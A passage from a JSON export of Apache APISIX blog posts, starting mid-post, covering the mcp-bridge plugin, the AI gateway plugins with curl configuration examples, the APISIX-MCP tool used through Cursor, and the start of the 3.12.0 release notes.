`mcp-bridge` Plugin?\\n\\nThe Apache APISIX `mcp-bridge` plugin launches a subprocess to manage the MCP Server, takes over its stdio channel, transforms client HTTP SSE requests into MCP protocol calls, and pushes responses back to the client via SSE.\\n\\n**Key features:**\\n\\n- \ud83d\udce1 Wraps MCP RPC calls into SSE message streams\\n- \ud83d\udd04 Manages subprocess stdio lifecycle with queued RPC scheduling\\n- \ud83d\uddc2\ufe0f Lightweight MCP session management (including session ID, ping keep-alive, and queuing)\\n- \ud83e\uddf0 Supports session sharing across multiple workers for stability in APISIX multi-worker environments\\n\\n## How It Works and Architecture Diagram\\n\\nBelow is a sequence diagram illustrating the working mechanism of the `mcp-bridge` plugin, helping you to understand the data flow from stdio to SSE:\\n\\n![MCP-Bridge Architecture Diagram](https://static.api7.ai/uploads/2025/04/21/7gnb0QrW_1-mcp-bridge-sequence-diagram.webp)\\n\\n**\u2705 Highlights:**\\n\\n- APISIX manages SSE long-lived connections\\n- The `mcp-bridge` plugin handles subprocesses, stdio, and scheduling queues\\n- Clients receive real-time subprocess outputs, forming streaming SSE responses\\n\\n## Application Scenarios and Benefits\\n\\n**\u2705 Typical Application Scenarios**\\n\\n- \ud83d\udee0\ufe0f Integrating existing MCP/stdio services with web platforms\\n- \ud83d\udda5\ufe0f Cross-language and cross-platform subprocess service management\\n\\n**\u2705 Benefits**\\n\\n- \ud83c\udf10 Modernization: Instantly transform stdio services into HTTP SSE APIs\\n- \ud83d\udd79\ufe0f Managed: Unified management of subprocess launch and IO lifecycle\\n- \ud83d\udcc8 Scalability: Session sharing in multi-worker environments for large-scale deployment support\\n- \ud83d\udd04 Traffic Control Integration: Seamless API management system integration with APISIX traffic control, authentication, and rate-limiting plugins\\n\\n## Authentication and Rate Limiting with Apache APISIX Plugins\\n\\nApache APISIX provides robust authentication plugins (like OAuth 2.0, JWT, and OIDC) and rate-limiting plugins (such as rate limiting and circuit breakers). These enhance the `mcp-bridge` plugin, ensuring secure authentication and traffic control for connected MCP services.\\n\\n### Authentication Plugins\\n\\n- Support for OAuth 2.0, JWT, and OIDC plugins to protect APIs and MCP services.\\n- Automatic client identity verification during API gateway requests to prevent unauthorized access.\\n\\n### Rate-Limiting Plugins\\n\\n- Rate Limiting: Restricts each client\'s request rate to prevent system overload.\\n- Circuit Breaker: Automatically switches or returns errors to avoid system crashes during high traffic or failures.\\n\\n## Adding Authentication and Rate Limiting to MCP Servers\\n\\n![Add Authentication and Rate Limiting to MCP Servers](https://static.api7.ai/uploads/2025/04/21/ffwep58W_2-add-auth-and-rate-limiting-to-mcp-server.webp)\\n\\nBy integrating authentication and rate-limiting plugins with the `mcp-bridge` plugin, you can enhance API security and ensure system stability in high-concurrency environments.\\n\\n## Roadmap\\n\\nThe current version is a prototype. Future enhancements include:\\n\\n- Currently, MCP sessions are not shared across multiple APISIX instances. For multi-node APISIX clusters, proper session persistence configuration on the front-end load balancer is essential to ensure requests from the same client always go to the same APISIX instance.\\n\\n- The current MCP SSE connection is loop-driven. While the loop doesn\'t consume many resources (stdio read/write will be synchronous non-blocking calls), it\'s not efficient. We plan to connect to a message queue for an event-driven, scalable cluster approach.\\n\\n- The MCP session management module is just a prototype. We intend to abstract an MCP proxy server module to support launching MCP servers within APISIX for advanced scenarios. This proxy server module will be event-driven rather than loop-driven.\\n\\n## Summary\\n\\nThe Apache APISIX `mcp-bridge` plugin significantly simplifies the integration of Model Context Protocol (MCP) services with the HTTP API world. It offers a modern streaming interface management approach for traditional services."},{"id":"Introducing APISIX AI Gateway","metadata":{"permalink":"/blog/2025/04/08/introducing-apisix-ai-gateway","source":"@site/blog/2025/04/08/introducing-apisix-ai-gateway.md","title":"Introducing APISIX AI Gateway","description":"In Apache APISIX version 3.12.0, we have further enhanced its AI support capabilities as a modern API gateway.","date":"2025-04-08T00:00:00.000Z","formattedDate":"April 8, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.48,"truncated":true,"authors":[{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"From stdio to HTTP SSE: Host Your MCP Server with APISIX API Gateway","permalink":"/blog/2025/04/21/host-mcp-server-with-api-gateway"},"nextItem":{"title":"APISIX-MCP: Embracing Intelligent API Management with AI + MCP","permalink":"/blog/2025/04/01/embrace-intelligent-api-management-with-ai-and-mcp"}},"content":">In Apache APISIX version 3.12.0, we have further enhanced its AI support capabilities as a modern API gateway. Through a rich plugin ecosystem and flexible architectural design, we provide developers with a complete AI gateway product.\\n\\n\x3c!--truncate--\x3e\\n\\nThis article delves into APISIX\'s innovative practices in the AI gateway domain from the following perspectives.\\n\\n## Core Functions of the AI Gateway\\n\\nAPISIX\'s plugin ecosystem offers out-of-the-box capabilities for AI scenarios. Below are the core plugins and their functions:\\n\\n### Proxy and Request Management\\n\\n#### 1. ai-proxy\\n\\nThe [`ai-proxy`](https://apisix.apache.org/docs/apisix/plugins/ai-proxy/) plugin simplifies access to large language models (LLMs) and embedding models by transforming plugin configurations into the designated request format. It supports integration with OpenAI, DeepSeek, and other OpenAI-compatible services.\\n\\nAdditionally, the plugin supports logging LLM request information in the access log, such as token usage, model, time to first response, and more.\\n\\n#### 2. ai-proxy-multi\\n\\nThe [`ai-proxy-multi`](https://apisix.apache.org/docs/apisix/plugins/ai-proxy-multi/) plugin simplifies access to large language models (LLMs) and embedding models by transforming plugin configurations into the request format required by OpenAI, DeepSeek, and other OpenAI-compatible services. It extends the capabilities of `ai-proxy` with load balancing, retries, fallbacks, and health checks.\\n\\nAdditionally, the plugin supports logging LLM request information in the access log, such as token usage, model, time to first response, and more.\\n\\n![AI Proxy](https://static.api7.ai/uploads/2025/08/01/TmTsNypy_ai-proxy-multi-workflow.webp)\\n\\n**Example: Load Balancing**:\\n\\nThe following example demonstrates how to configure two models for load balancing, forwarding 80% of the traffic to one instance and 20% to another.\\n\\nFor demonstration and easier differentiation, you will configure one OpenAI instance and one DeepSeek instance as the upstream LLM services. Create a route and update with your LLM providers, models, API keys, and endpoints if applicable, setting the weight of the `openai-instance` to `8` and the weight of the `deepseek-instance` to `2`.\\n\\n```bash\\ncurl \\"http://127.0.0.1:9180/apisix/admin/routes\\" -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"id\\": \\"ai-proxy-multi-route\\",\\n    \\"uri\\": \\"/anything\\",\\n    \\"methods\\": [\\"POST\\"],\\n    \\"plugins\\": {\\n      \\"ai-proxy-multi\\": {\\n        \\"instances\\": [\\n          {\\n            \\"name\\": \\"openai-instance\\",\\n            \\"provider\\": \\"openai\\",\\n            \\"weight\\": 8,\\n            \\"auth\\": {\\n              \\"header\\": {\\n                \\"Authorization\\": \\"Bearer \'\\"$OPENAI_API_KEY\\"\'\\"\\n              }\\n            },\\n            \\"options\\": {\\n              \\"model\\": \\"gpt-4\\"\\n            }\\n          },\\n          {\\n            \\"name\\": \\"deepseek-instance\\",\\n            \\"provider\\": \\"deepseek\\",\\n            \\"weight\\": 2,\\n            \\"auth\\": {\\n              \\"header\\": {\\n                \\"Authorization\\": \\"Bearer \'\\"$DEEPSEEK_API_KEY\\"\'\\"\\n              }\\n            },\\n            \\"options\\": {\\n              \\"model\\": \\"deepseek-chat\\"\\n            }\\n          }\\n        ]\\n      }\\n    }\\n  }\'\\n```\\n\\n#### 3. ai-request-rewrite\\n\\nThe [`ai-request-rewrite`](https://apisix.apache.org/docs/apisix/plugins/ai-request-rewrite) plugin processes client requests by forwarding them to large language model (LLM) services for transformation before relaying them to upstream services. This enables AI-driven redaction, enrichment, and reformatting of requests. The plugin supports integration with OpenAI, DeepSeek, and other OpenAI-compatible APIs.\\n\\n**Example: Redacting Sensitive Information**:\\n\\nThe following example demonstrates how you can use the `ai-request-rewrite` plugin to redact sensitive information before the request reaches the upstream service.\\n\\nCreate a route and configure the `ai-request-rewrite` plugin as follows, specifying the provider as `openai`, attaching the OpenAI API key in the `Authorization` header, specifying the model name, and indicating the information to redact before the request reaches the upstream service.\\n\\n```shell\\ncurl \\"http://127.0.0.1:9180/apisix/admin/routes\\" -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"id\\": \\"ai-request-rewrite-route\\",\\n    \\"uri\\": \\"/anything\\",\\n    \\"methods\\": [\\"POST\\"],\\n    \\"plugins\\": {\\n      \\"ai-request-rewrite\\": {\\n        \\"provider\\": \\"openai\\",\\n        \\"auth\\": {\\n          \\"header\\": {\\n            \\"Authorization\\": \\"Bearer \'\\"$OPENAI_API_KEY\\"\'\\"\\n          }\\n        },\\n        \\"options\\":{\\n          \\"model\\": \\"gpt-4\\"\\n        },\\n        \\"prompt\\": \\"Given a JSON request body, identify and mask any sensitive information such as credit card numbers, social security numbers, and personal identification numbers (e.g., passport or driver\'s license numbers). Replace detected sensitive values with a masked format (e.g., \\\\\\"*** **** **** 1234\\\\\\") for credit card numbers. Ensure the JSON structure remains unchanged.\\"\\n      }\\n    },\\n    \\"upstream\\": {\\n      \\"type\\": \\"roundrobin\\",\\n      \\"nodes\\": {\\n        \\"httpbin.org:80\\": 1\\n      }\\n    }\\n  }\'\\n```\\n\\nSend a POST request to the route with some personally identifiable information:\\n\\n```shell\\ncurl \\"http://127.0.0.1:9080/anything\\" -X POST \\\\\\n  -H \\"Content-Type: application/json\\" \\\\\\n  -d \'{\\n    \\"content\\": \\"John said his debit card number is 4111 1111 1111 1111 and SIN is 123-45-6789.\\"\\n  }\'\\n```\\n\\nExample response:\\n\\n```json\\n{\\n  \\"args\\": {},\\n  # highlight-next-line\\n  \\"data\\": \\"{\\\\n    \\\\\\"content\\\\\\": \\\\\\"John said his debit card number is **** **** **** 1111 and SIN is ***-**-****.\\\\\\"\\\\n  }\\"\\n  ...,\\n  \\"json\\": {\\n    \\"messages\\": [\\n      {\\n        \\"content\\": \\"Client information from customer service calls\\",\\n        \\"role\\": \\"system\\"\\n      },\\n      {\\n        # highlight-next-line\\n        \\"content\\": \\"John said his debit card number is **** **** **** 1111 and SIN is ***-**-****.\\"\\n        \\"role\\": \\"user\\"\\n      }\\n    ],\\n    \\"model\\": \\"openai\\"\\n  },\\n  \\"method\\": \\"POST\\",\\n  \\"origin\\": \\"192.168.97.1, 103.97.2.170\\",\\n  \\"url\\": \\"http://127.0.0.1/anything\\"\\n}\\n```\\n\\n### Traffic Control\\n\\n#### 4. ai-rate-limiting\\n\\nThe [`ai-rate-limiting`](https://apisix.apache.org/docs/apisix/plugins/ai-rate-limiting/) plugin enforces token-based rate limiting for requests sent to large language model (LLM) services. It helps manage API usage by controlling the number of tokens consumed within a specified time frame, ensuring fair resource allocation and preventing excessive load on the service. It is often used in conjunction with the ai-proxy-multi plugin.\\n\\n**Example: Rate Limiting a Single Instance**:\\n\\nThe following example demonstrates how to use ai-proxy-multi to configure two models for load balancing, forwarding 80% of the traffic to one instance and 20% to another. Additionally, use `ai-rate-limiting` to configure token-based rate limiting on the instance that receives 80% of the traffic, so that when the configured quota is fully consumed, the additional traffic will be forwarded to the other instance.\\n\\nCreate a route and update with your LLM providers, models, API keys, and endpoints as needed:\\n\\n```bash\\ncurl \\"http://127.0.0.1:9180/apisix/admin/routes\\" -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"id\\": \\"ai-rate-limiting-route\\",\\n    \\"uri\\": \\"/anything\\",\\n    \\"methods\\": [\\"POST\\"],\\n    \\"plugins\\": {\\n      \\"ai-rate-limiting\\": {\\n        \\"instances\\": [\\n          {\\n            \\"name\\": \\"deepseek-instance-1\\",\\n            \\"provider\\": \\"deepseek\\",\\n            \\"weight\\": 8,\\n            \\"auth\\": {\\n              \\"header\\": {\\n                \\"Authorization\\": \\"Bearer \'\\"$DEEPSEEK_API_KEY\\"\'\\"\\n              }\\n            },\\n            \\"options\\": {\\n              \\"model\\": \\"deepseek-chat\\"\\n            }\\n          },\\n          {\\n            \\"name\\": \\"deepseek-instance-2\\",\\n            \\"provider\\": \\"deepseek\\",\\n            \\"weight\\": 2,\\n            \\"auth\\": {\\n              \\"header\\": {\\n                \\"Authorization\\": \\"Bearer \'\\"$DEEPSEEK_API_KEY\\"\'\\"\\n              }\\n            },\\n            \\"options\\": {\\n              \\"model\\": \\"deepseek-chat\\"\\n            }\\n          }\\n        ]\\n      },\\n      \\"ai-rate-limiting\\": {\\n        \\"instances\\": [\\n          {\\n            \\"name\\": \\"deepseek-instance-1\\",\\n            \\"limit_strategy\\": \\"total_tokens\\",\\n            \\"limit\\": 100,\\n            \\"time_window\\": 30\\n          }\\n        ]\\n      }\\n    }\\n  }\'\\n```\\n\\nSend a POST request to the route with a system prompt and a sample user question in the request body:\\n\\n```bash\\ncurl \\"http://127.0.0.1:9080/anything\\" -X POST \\\\\\n  -H \\"Content-Type: application/json\\" \\\\\\n  -d \'{\\n    \\"messages\\": [\\n      { \\"role\\": \\"system\\", \\"content\\": \\"You are a mathematician\\" },\\n      { \\"role\\": \\"user\\", \\"content\\": \\"What is 1+1?\\" }\\n    ]\\n  }\'\\n```\\n\\nExample response:\\n\\n```json\\n{\\n  ...\\n  \\"model\\": \\"deepseek-chat\\",\\n  \\"choices\\": [\\n    {\\n      \\"index\\": 0,\\n      \\"message\\": {\\n        \\"role\\": \\"assistant\\",\\n        \\"content\\": \\"1 + 1 equals 2. This is a fundamental arithmetic operation where adding one unit to another results in a total of two units.\\"\\n      },\\n      \\"logprobs\\": null,\\n      \\"finish_reason\\": \\"stop\\"\\n    }\\n  ],\\n  ...\\n}\\n```\\n\\nIf the `deepseek-instance-1` instance\'s rate limiting quota of 100 tokens has been consumed within a 30-second window, additional requests will be forwarded to the `deepseek-instance-2` instance, which is not rate limited.\\n\\n### Prompt Processing\\n\\n#### 5. ai-prompt-decorator\\n\\nThe [`ai-prompt-decorator`](https://apisix.apache.org/docs/apisix/plugins/ai-prompt-decorator/) plugin sets the context for content generation by adding pre-designed prompts before and after user input. This practice helps the model operate according to the intended guidelines during interactions.\\n\\n#### 6. ai-prompt-template\\n\\nThe [`ai-prompt-template`](https://apisix.apache.org/docs/apisix/plugins/ai-prompt-template/) plugin supports pre-configured prompt templates that only accept user input in specified template variables, operating in a \\"fill-in-the-blank\\" manner.\\n\\n#### 7. ai-prompt-guard\\n\\nThe [`ai-prompt-guard`](https://apisix.apache.org/docs/apisix/plugins/ai-prompt-guard/) plugin protects your large language model (LLM) endpoints by inspecting and validating incoming prompt messages. It checks the request content against user-defined allow and deny patterns, ensuring only approved input is forwarded to the upstream LLM. Depending on its configuration, the plugin can check either the latest message or the entire conversation history and can be set to inspect prompts from all roles or only from the end user.\\n\\n![ai-prompt-guard](https://static.api7.ai/uploads/2025/08/01/6Dl4AQGL_ai-prompt-guard-workflow.webp)\\n\\n### Content Moderation\\n\\n#### 8. ai-aws-content-moderation\\n\\nThe [`ai-aws-content-moderation`](https://apisix.apache.org/docs/apisix/plugins/ai-aws-content-moderation/) plugin integrates with AWS Comprehend to check for toxic content in the request body when proxying to large language models (LLMs), such as profanity, hate speech, insults, harassment, and violence, and rejects requests when the evaluation result exceeds the configured threshold.\\n\\n### Data Enhancement\\n\\n#### 9. ai-rag\\n\\nThe [`ai-rag`](https://apisix.apache.org/docs/apisix/plugins/ai-rag/) plugin provides retrieval-augmented generation (RAG) capabilities for large language models (LLMs). It efficiently retrieves relevant documents or information from external data sources to enhance LLM responses, improving the accuracy and context relevance of the generated output. The plugin supports using Azure OpenAI and Azure AI Search services to generate embeddings and perform vector searches.\\n\\n## Observability\\n\\nAPISIX has enhanced observability for AI applications, enabling real-time monitoring of key metrics such as time to first generated token (TTFT), token usage, and error rates. These capabilities help teams optimize costs, promptly identify performance issues, and ensure transparency through detailed logs and auditing mechanisms. Additionally, APISIX tracks token usage through access logs and observability components, effectively preventing API abuse and avoiding overbilling issues.\\n\\n## Summary\\n\\nIn the [Apache APISIX 3.12.0](https://apisix.apache.org/blog/2025/04/01/release-apache-apisix-3.12.0/), the APISIX AI Gateway has strengthened its AI support capabilities as a modern API gateway through a rich plugin ecosystem and flexible architectural design.\\n\\nIt offers features such as proxy and request management, traffic control, prompt processing, content moderation, and data enhancement, with support for integration with services like OpenAI and DeepSeek. Performance and security are optimized through mechanisms like load balancing, rate limiting, and content filtering.\\n\\nMoreover, APISIX has enhanced observability, enabling real-time monitoring of key metrics to help teams optimize costs, identify performance issues, and ensure transparency. This release provides developers with a powerful, flexible, and secure platform for building and managing AI-driven applications."},{"id":"APISIX-MCP: Embracing Intelligent API Management with AI + MCP","metadata":{"permalink":"/blog/2025/04/01/embrace-intelligent-api-management-with-ai-and-mcp","source":"@site/blog/2025/04/01/embrace-intelligent-api-management-with-ai-and-mcp.md","title":"APISIX-MCP: Embracing Intelligent API Management with AI + MCP","description":"Discover how APISIX-MCP leverages AI for intuitive API management, simplifying resource management through natural language interactions.","date":"2025-04-01T00:00:00.000Z","formattedDate":"April 1, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.855,"truncated":true,"authors":[{"name":"Zhihuang Lin","title":"API7 Engineer","url":"https://github.com/oil-oil","image_url":"https://github.com/oil-oil.png","imageURL":"https://github.com/oil-oil.png"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"Introducing APISIX AI Gateway","permalink":"/blog/2025/04/08/introducing-apisix-ai-gateway"},"nextItem":{"title":"Release Apache APISIX 3.12.0","permalink":"/blog/2025/04/01/release-apache-apisix-3.12.0"}},"content":"> This article introduces the MCP protocol and its application in APISIX-MCP. APISIX-MCP simplifies API management through natural language interaction, supporting the creation, updating, and deletion of resources.  \\n\x3c!--truncate--\x3e\\n\\n## Preface  \\n\\nWith the explosive growth of large-scale AI model applications, many traditional systems are eager to integrate AI capabilities quickly. However, the current landscape of AI tools lacks unified standards, resulting in severe fragmentation. Different models vary in capability and integration methods, creating significant challenges for traditional applications during adoption.  \\n\\nAgainst this backdrop, in late 2024, Anthropic\u2014the company behind the renowned Claude model\u2014introduced the **Model Context Protocol (MCP)**. MCP positions itself as the **\\"USB-C interface\\" for AI applications**. Just as USB-C standardizes connections for peripherals and accessories, MCP provides a standardized approach for AI models to connect with diverse data sources and tools.  \\n\\n![MCP Architecture](https://static.api7.ai/uploads/2025/04/01/u6Q4dGDZ_apisix-mcp-architecture-new.webp)  \\n\\nNumerous services and applications have already adopted MCP. For example:  \\n\\n- **GitHub-MCP** enables natural language code submissions and PR creation.  \\n- **Figma MCP** allows AI to generate UI designs directly.  \\n- With **Browser-tools-MCP**, tools like Cursor can debug code by interacting with DOM elements and console logs.  \\n\\nThe official MCP repository includes implementations for Google Drive, Slack, Git, and various databases. As an open standard, MCP has gained widespread recognition in the AI community, attracting third-party developers who contribute hundreds of new MCP services daily. Anthropic, as the founder, actively drives MCP\u2019s evolution by refining the protocol and educating developers.  \\n\\n## About APISIX-MCP  \\n\\nThe rise of MCP offers traditional applications a new technical pathway. Leveraging MCP\u2019s standardized integration capabilities, we developed [**APISIX-MCP**](https://github.com/api7/apisix-mcp), which bridges large language models with Apache APISIX\u2019s Admin API through natural language interaction. The current implementation supports the following operations:  \\n\\n### General Operations  \\n\\n- `get_resource`: Retrieve resources by type (routes, services, upstreams, etc.).  \\n- `delete_resource`: Delete resources by ID.  \\n\\n### API Resource Management  \\n\\n- `create_route`/`update_route`/`delete_route`: Manage routes.  \\n- `create_service`/`update_service`/`delete_service`: Manage services.  \\n- `create_upstream`/`update_upstream`/`delete_upstream`: Manage upstreams.  \\n- `create_ssl`/`update_ssl`/`delete_ssl`: Manage SSL certificates.  \\n- `create_or_update_proto`: Manage Protobuf definitions.  \\n- `create_or_update_stream_route`: Manage stream routes.  \\n\\n### Plugin Operations  \\n\\n- `get_all_plugin_names`: List all available plugins.  \\n- `get_plugin_info`/`get_plugins_by_type`/`get_plugin_schema`: Fetch plugin configurations.  \\n- `create_plugin_config`/`update_plugin_config`: Manage plugin configurations.  \\n- `create_global_rule`/`update_global_rule`: Manage global plugin rules.  \\n- `get_plugin_metadata`/`create_or_update_plugin_metadata`/`delete_plugin_metadata`: Manage plugin metadata.  \\n\\n### Security Configuration  \\n\\n- `get_secret_by_id`/`create_secret`/`update_secret`: Manage secrets.  \\n- `create_or_update_consumer`/`delete_consumer`: Manage consumers.  \\n- `get_credential`/`create_or_update_credential`/`delete_credential`: Manage consumer credentials.  \\n- `create_consumer_group`/`delete_consumer_group`: Manage consumer groups.  \\n\\n## How to Use APISIX-MCP  \\n\\nAPISIX-MCP is now open-sourced and available on [npm](https://www.npmjs.com/package/apisix-mcp) and [GitHub](https://github.com/api7/apisix-mcp). It can be configured via any MCP-compatible AI client, such as Claude Desktop, Cursor, or the Cline plugin for VSCode.  \\n\\nBelow is a step-by-step guide using **Cursor**:  \\n\\n1. Open Cursor, click the settings icon, and navigate to the settings page.  \\n  \\n   ![Configure cursor for APISIX-MCP](https://static.api7.ai/uploads/2025/04/01/OCQcecuQ_apisix-mcp-2.webp)  \\n\\n2. Click **\\"Add new global MCP server\\"** to edit the `mcp.json` configuration file:  \\n\\n   ```json\\n   {\\n     \\"mcpServers\\": {\\n       \\"apisix-mcp\\": {\\n         \\"command\\": \\"npx\\",\\n         \\"args\\": [\\"-y\\", \\"apisix-mcp\\"],\\n         \\"env\\": {\\n           \\"APISIX_SERVER_HOST\\": \\"your-apisix-server-host\\",\\n           \\"APISIX_ADMIN_API_PORT\\": \\"your-apisix-admin-api-port\\",\\n           \\"APISIX_ADMIN_API_PREFIX\\": \\"your-apisix-admin-api-prefix\\",\\n           \\"APISIX_ADMIN_KEY\\": \\"your-apisix-api-key\\"\\n         }\\n       }\\n     }\\n   }\\n   ```  \\n  \\nIn the `mcpServers` field of the configuration file, add a service `apisix-mcp`, which can be changed. Then configure the commands for running the MCP service.\\n\\n- **`command`**: `npx` (Node.js package executor).  \\n- **`args`**: `-y` (auto-install dependencies) and `apisix-mcp` (package name).  \\n- **`env`**: Customize APISIX connection settings (defaults below):  \\n\\nIn the `env` field, you can specify the APISIX service access address, Admin API port, prefix, and authentication key. These environment variables have default values, so if you start APISIX without any custom configuration, you can omit the `env` field entirely. The default values for each variable are as follows:\\n\\n   | Variable                  | Description                          | Default Value               |  \\n   |---------------------------|--------------------------------------|-----------------------------|  \\n   | `APISIX_SERVER_HOST`      | APISIX server host                   | `http://127.0.0.1`          |  \\n   | `APISIX_ADMIN_API_PORT`   | Admin API port                       | `9180`                      |  \\n   | `APISIX_ADMIN_API_PREFIX` | Admin API prefix                     | `/apisix/admin`             |  \\n   | `APISIX_ADMIN_KEY`        | Admin API authentication key         | `edd1c9f034335f136f87ad84b625c8f1` |  \\n\\n3. Upon successful configuration, the MCP Servers list will show a green indicator for `apisix-mcp`, along with available tools.  \\n  \\n   ![Successful Configuration](https://static.api7.ai/uploads/2025/04/01/toaXLc3n_apisix-mcp-3.webp)  \\n\\n   > Note: If setup fails, refer to the [APISIX-MCP GitHub](https://github.com/api7/apisix-mcp) documentation for manual builds.  \\n\\n4. In the chat panel, select **Agent** mode and choose a model (e.g., Claude Sonnet 3.5/3.7 or GPT-4o).  \\n\\n   ![Select Agent Models](https://static.api7.ai/uploads/2025/04/01/g9v91DIf_apisix-mcp-4.webp)  \\n\\n5. Next, we can enter relevant operational commands to verify if the MCP service is functioning correctly. Following the workflow in APISIX\'s Getting Started documentation, we input the following into the dialog box and send the message:  \\n\\n   > *\\"Help me create a route with path `/api` for accessing `https://httpbin.org` upstream, with CORS and rate-limiting plugins. Print the route details after configuration.\\"*  \\n\\n6. Next, in Cursor, you will see a process similar to the MCP tool invocation demonstrated in the video below. Due to the inherent randomness of large AI model responses, the exact operations performed may vary from the example shown.\\n\\n   <video width=\\"100%\\" controls>  \\n     <source src=\\"https://static.api7.ai/uploads/2025/04/01/V7CmO59u_mcp-demo.mp4\\" type=\\"video/mp4\\"/>  \\n   </video>  \\n\\nHere, the auto-execution mode (YOLO Mode) is enabled, allowing Cursor to automatically invoke all tools in the MCP server. From the video, we can observe the AI performing the following operations based on our requirements:\\n\\n- Analyzing the plugins we need to configure, then calling `get_plugins_list` to retrieve all plugin names\\n- Invoking `get_plugin_schema` to examine detailed configuration information for different plugins\\n- Calling `create_route` to create the route\\n- Using `update_route` to add the previously queried plugin configurations to the route\\n- Executing `get_route` to verify whether the route was successfully configured and if the configuration is correct\\n\\n7. The resulting route configuration includes:  \\n\\n   - **Route ID**: `httpbin`  \\n   - **Path**: `/api/*`  \\n   - **Methods**: `GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `HEAD`, `OPTIONS`\\n   - **CORS Plugin**:  \\n\\n    ```\\n    allow_origins: *\\n    allow_methods: *\\n    allow_headers: *\\n    expose_headers: X-Custom-Header\\n    max_age: 3600\\n    allow_credential: false\\n    ```\\n\\n    - **limit-count Plugin**:  \\n\\n    ```\\n    count: 100\\n    time_window: 60\\n    key: remote_addr\\n    rejected_code: 429\\n    policy: local\\n    ```\\n\\n   - **Upstream**:\\n\\n    ```\\n    type: roundrobin (load balancing strategy using round-robin)  \\n    upstream node: httpbin.org:443 (backend service address)  \\n    ```\\n\\n## Advantages of AI-Driven Operations  \\n\\nIn the above process, we accomplished the creation of a route configured with CORS and rate-limiting through just one round of natural language interaction with AI. Compared to manual route configuration, leveraging AI offers several distinct advantages:\\n\\n- **Reduced Cognitive Load**: Eliminates manual documentation lookup and parameter memorization.  \\n- **Automated Workflows**: AI decomposes tasks (e.g., plugin setup \u2192 route creation) without human intervention.  \\n- **Closed-Loop Validation**: Auto-verification ensures correctness.  \\n- **Iterative Optimization**: Continuous dialogue refines configurations.  \\n\\nThis interaction model transforms complex configuration processes into natural conversational experiences while maintaining accuracy and verifiability. These capabilities are achieved through the MCP protocol\'s semantic parsing of requirements, intelligent tool invocation, and final execution via Admin API.\\n\\nIt\'s important to note that APISIX-MCP isn\'t designed to completely replace manual configuration, but rather to optimize efficiency for high-frequency operations. Its value shines particularly in configuration debugging and rapid validation scenarios, creating effective complementarity with traditional management approaches. As the MCP ecosystem continues to evolve, we can anticipate deeper integration of such tools in API management, promising more sophisticated capabilities.\\n\\n## Conclusion  \\n\\nMCP enables intelligent operations for complex API systems. APISIX-MCP lowers the barrier to Apache APISIX adoption, with future plans for AI-traffic-specific plugins. The fusion of AI and API management promises smarter, more efficient infrastructure governance."},{"id":"Release Apache APISIX 3.12.0","metadata":{"permalink":"/blog/2025/04/01/release-apache-apisix-3.12.0","source":"@site/blog/2025/04/01/release-apache-apisix-3.12.0.md","title":"Release Apache APISIX 3.12.0","description":"The Apache APISIX 3.12.0 version is released on April 1, 2025. This release includes a few changes, new features, bug fixes, and other improvements to user experiences.","date":"2025-04-01T00:00:00.000Z","formattedDate":"April 1, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":4.785,"truncated":true,"authors":[{"name":"Ashish Tiwari","title":"Author","url":"https://github.com/Revolyssup","image_url":"https://github.com/Revolyssup.png","imageURL":"https://github.com/Revolyssup.png"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://github.com/kayx23.png","imageURL":"https://github.com/kayx23.png"}],"prevItem":{"title":"APISIX-MCP: Embracing Intelligent API Management with AI + MCP","permalink":"/blog/2025/04/01/embrace-intelligent-api-management-with-ai-and-mcp"},"nextItem":{"title":"2025 Monthly Report (March 01 - March 31)","permalink":"/blog/2025/03/31/2025-march-monthly-report"}},"content":"We are glad to present Apache APISIX 3.12.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\nThis new release adds a number of new features, including a number of AI plugins, the support of valid issuers in the `openid-connect` plugin, the support of rate limiting response header name customization, and more.\\n\\nThere are also a few important changes included in this release. Should you find these changes impacting your operations, please plan your upgrade accordingly.\\n\\n## Breaking Changes\\n\\n### Refactor `ai-proxy` plugin\\n\\nThe `ai-proxy` plugin has been refactored to improve maintainability and performance. Changes include not requiring an upstream configuration, the removal of max timeout in schema, and the support for various providers, including openai, deepseek, and openai-compatible.\\n\\nFor more information, see PR [#12030](https://github.com/apache/apisix/pull/12030), [#12055](https://github.com/apache/apisix/pull/12055), and [#12004](https://github.com/apache/apisix/pull/12004).\\n\\n### Replace plugin attribute with plugin metadata in `opentelemetry` plugin\\n\\nPlugin attributes `batch_span_processor`, `collector`, `trace_id_source`, `resource`, and `set_ngx_var` configurations are now migrated to plugin metadata from configuration file.\\n\\nFor more information, see PR [#11940](https://github.com/apache/apisix/pull/11940).\\n\\n### Add expiration time for Prometheus metrics\\n\\nIn the previous version, Prometheus metrics do not expire. APISIX now ensures that all Prometheus metrics have an expiration time to prevent stale data accumulation. You can customize the metric expiration time in the configuration file. Users relying on Prometheus should see more efficient storage usage.\\n\\nFor more information, see PR [#11838](https://github.com/apache/apisix/pull/11838).\\n\\n### Remove the requirement of `case` in `workflow` plugin\\n\\nThe `workflow` plugin now does not enforce `case` as a required attribute.\\n\\nFor more information, see PR [#11787](https://github.com/apache/apisix/pull/11787).\\n\\n## New Features\\n\\n### Support proxying to embedding models in `ai-proxy` plugin\\n\\nAPISIX now supports proxying to embedding models, in addition to proxying to LLM models.\\n\\nFor more information, see PR [#12062](https://github.com/apache/apisix/pull/12062).\\n\\n### Add `ai-proxy-multi` plugin\\n\\nThe `ai-proxy-multi` plugin has been introduced to support load balancing between multiple LLM instances, enhancing fault tolerance. The plugin can be used with `ai-rate-limiting` to implement rate limiting for specific 